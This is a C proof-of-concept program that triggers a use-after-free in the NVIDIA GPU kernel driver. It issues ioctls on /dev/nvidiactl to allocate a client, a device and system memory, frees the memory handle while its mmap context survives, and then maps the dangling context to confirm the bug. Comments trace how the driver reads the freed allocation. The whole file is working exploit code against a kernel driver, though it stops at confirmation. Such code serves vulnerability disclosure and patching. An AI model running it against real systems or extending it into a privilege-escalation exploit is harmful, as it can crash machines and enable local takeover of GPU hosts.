#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <unistd.h>

#define NV_IOCTL_MAGIC 'F'
#define NV_ESC_RM_ALLOC 0x2B
#define NV_ESC_RM_ALLOC_MEMORY 0x27
#define NV_ESC_RM_FREE 0x29
#define NV_ESC_REGISTER_FD 0xC9
#define NV_ESC_CHECK_VERSION_STR 0xD2

#define NV01_ROOT_CLIENT 0x00000041
#define NV01_DEVICE_0 0x80
#define NV01_MEMORY_SYSTEM 0x3e

#define __NV_IOWR(nr, type) _IOWR(NV_IOCTL_MAGIC, (nr), type)

// version check structure
typedef struct {
  uint32_t cmd;
  uint32_t reply;
  char versionString[64];
} nv_ioctl_rm_api_version_t;

typedef struct {
  uint32_t hRoot;
  uint32_t hObjectParent;
  uint32_t hObjectNew;
  uint32_t hClass;
  uint64_t pAllocParms __attribute__((aligned(8)));
  uint64_t pRightsRequested __attribute__((aligned(8)));
  uint32_t paramsSize;
  uint32_t flags;
  uint32_t status;
} NVOS64_PARAMETERS;

typedef struct {
  uint32_t deviceId;
  uint32_t hClientShare;
  uint32_t hTargetClient;
  uint32_t hTargetDevice;
  uint32_t flags;
  uint64_t vaSpaceSize __attribute__((aligned(8)));
  uint64_t vaStartInternal __attribute__((aligned(8)));
  uint64_t vaLimitInternal __attribute__((aligned(8)));
  uint32_t vaMode;
} NV0080_ALLOC_PARAMETERS;

typedef struct {
  uint32_t hRoot;
  uint32_t hObjectParent;
  uint32_t hObjectNew;
  uint32_t hClass;
  uint32_t flags;
  uint64_t pMemory __attribute__((aligned(8)));
  uint64_t limit __attribute__((aligned(8)));
  uint32_t status;
} NVOS02_PARAMETERS;

typedef struct {
  NVOS02_PARAMETERS params;
  int32_t fd;
} nv_ioctl_nvos02_parameters_with_fd;

typedef struct {
  uint32_t hRoot;
  uint32_t hObjectParent;
  uint32_t hObjectOld;
  uint32_t status;
} NVOS00_PARAMETERS;

// register FD
typedef struct {
  int32_t ctl_fd;
} nv_ioctl_register_fd_t;

int do_version_check(int ctl_fd) {
  nv_ioctl_rm_api_version_t ver;
  memset(&ver, 0, sizeof(ver));
  ver.cmd = 0;
  strncpy(ver.versionString, "590.48.01", sizeof(ver.versionString));
  int ret = ioctl(
      ctl_fd, __NV_IOWR(NV_ESC_CHECK_VERSION_STR, nv_ioctl_rm_api_version_t),
      &ver);
  printf("version_check: ret=%d, reply=%u\n", ret, ver.reply);
  return (ret == 0 && ver.reply == 1) ? 0 : -1;
}

int main() {
  int ctl_fd, dev_fd;
  int ret;

  printf("mmap_context UAF PoC\n\n");

  ctl_fd = open("/dev/nvidiactl", O_RDWR);
  if (ctl_fd < 0) {
    perror("open nvidiactl");
    return 1;
  }

  dev_fd = open("/dev/nvidia0", O_RDWR);
  if (dev_fd < 0) {
    perror("open nvidia0");
    return 1;
  }
  printf("ctl_fd=%d, dev_fd=%d\n", ctl_fd, dev_fd);

  if (do_version_check(ctl_fd) != 0) {
    printf("version check failed\n");
    return 1;
  }

  printf("allocate client\n");
  NVOS64_PARAMETERS client_p;
  memset(&client_p, 0, sizeof(client_p));
  client_p.hClass = NV01_ROOT_CLIENT;
  ret = ioctl(ctl_fd, __NV_IOWR(NV_ESC_RM_ALLOC, NVOS64_PARAMETERS), &client_p);
  printf("client alloc: ret=%d, status=0x%x, handle=0x%x\n", ret,
         client_p.status, client_p.hObjectNew);
  if (client_p.status != 0) {
    printf("failed to allocate client\n");
    return 1;
  }

  uint32_t client = client_p.hObjectNew;

  printf("allocate device\n");
  NV0080_ALLOC_PARAMETERS dev_alloc;
  memset(&dev_alloc, 0, sizeof(dev_alloc));
  dev_alloc.deviceId = 0;
  dev_alloc.vaMode = 2;

  NVOS64_PARAMETERS dev_p;
  memset(&dev_p, 0, sizeof(dev_p));
  dev_p.hRoot = client;
  dev_p.hObjectParent = client;
  dev_p.hClass = NV01_DEVICE_0;
  dev_p.pAllocParms = (uint64_t)(uintptr_t)&dev_alloc;
  dev_p.paramsSize = sizeof(dev_alloc);

  ret = ioctl(ctl_fd, __NV_IOWR(NV_ESC_RM_ALLOC, NVOS64_PARAMETERS), &dev_p);
  printf("device alloc: ret=%d, status=0x%x, handle=0x%x\n", ret, dev_p.status,
         dev_p.hObjectNew);
  if (dev_p.status != 0) {
    printf("failed to allocate device\n");
    return 1;
  }

  uint32_t device = dev_p.hObjectNew;

  printf("register FD\n");
  nv_ioctl_register_fd_t reg = {.ctl_fd = ctl_fd};
  ret = ioctl(dev_fd, __NV_IOWR(NV_ESC_REGISTER_FD, nv_ioctl_register_fd_t),
              &reg);
  printf("register_fd: ret=%d\n", ret);

  printf("allocate memory (NV01_MEMORY_SYSTEM)\n");
  nv_ioctl_nvos02_parameters_with_fd mem;
  memset(&mem, 0, sizeof(mem));
  mem.params.hRoot = client;
  mem.params.hObjectParent = device;
  mem.params.hObjectNew = 0xbeef0001; // must specify handle for NVOS02
  mem.params.hClass = NV01_MEMORY_SYSTEM;
  mem.params.flags = 0; // default mapping - triggers mmap context creation
  mem.params.pMemory = 0;
  mem.params.limit = 0xFFF; // 4KB
  mem.fd = ctl_fd;          // mmap context goes on ctl_fd

  unsigned long alloc_nr =
      __NV_IOWR(NV_ESC_RM_ALLOC_MEMORY, nv_ioctl_nvos02_parameters_with_fd);
  ret = ioctl(dev_fd, alloc_nr, &mem);
  printf("alloc_memory: ret=%d, errno=%d (%s), status=0x%x, handle=0x%x, "
         "pMemory=0x%lx\n",
         ret, errno, strerror(errno), mem.params.status, mem.params.hObjectNew,
         (unsigned long)mem.params.pMemory);

  if (mem.params.status != 0) {
    printf("allocation failed with status 0x%x - cannot proceed\n",
           mem.params.status);
    close(dev_fd);
    close(ctl_fd);
    return 1;
  }

  uint32_t mem_handle = mem.params.hObjectNew;
  printf("memory allocated: handle=0x%x\n", mem_handle);

  printf("free memory handle (before mmap)\n");
  NVOS00_PARAMETERS free_p;
  memset(&free_p, 0, sizeof(free_p));
  free_p.hRoot = client;
  free_p.hObjectParent = device;
  free_p.hObjectOld = 0xbeef0001;

  ret = ioctl(ctl_fd, __NV_IOWR(NV_ESC_RM_FREE, NVOS00_PARAMETERS), &free_p);
  printf("rm_free: ret=%d, status=0x%x\n", ret, free_p.status);

  if (free_p.status == 0) {
    printf("memory handle freed while mmap context is still valid\n");
    printf("the mmap_context.alloc pointer is now dangling!\n");

    // mmap on ctl_fd, nvidia_mmap_helper() will:
    //   at = (nv_alloc_t *)mmap_context->alloc;  // freed pointer
    //   page_index = mmap_context->page_index;
    //   pages = NV_VMA_SIZE(vma) >> PAGE_SHIFT;
    //   if ((page_index + pages) > at->num_pages)  // reads freed memory
    //   ...
    //   nvidia_mmap_sysmem(vma, at, ...)  // uses freed at
    printf("attempting mmap() on ctl_fd to verify UAF\n\n");
    void *mapped =
        mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, ctl_fd, 0);
    if (mapped == MAP_FAILED) {
      printf("mmap failed: errno=%d (%s)\n", errno, strerror(errno));
    } else {
      printf("mmap succeeded at %p - UAF confirmed\n", mapped);
      munmap(mapped, 4096);
    }
  } else {
    printf("rm_free failed (status=0x%x)\n", free_p.status);
  }

  close(dev_fd);
  close(ctl_fd);

  return 0;
}
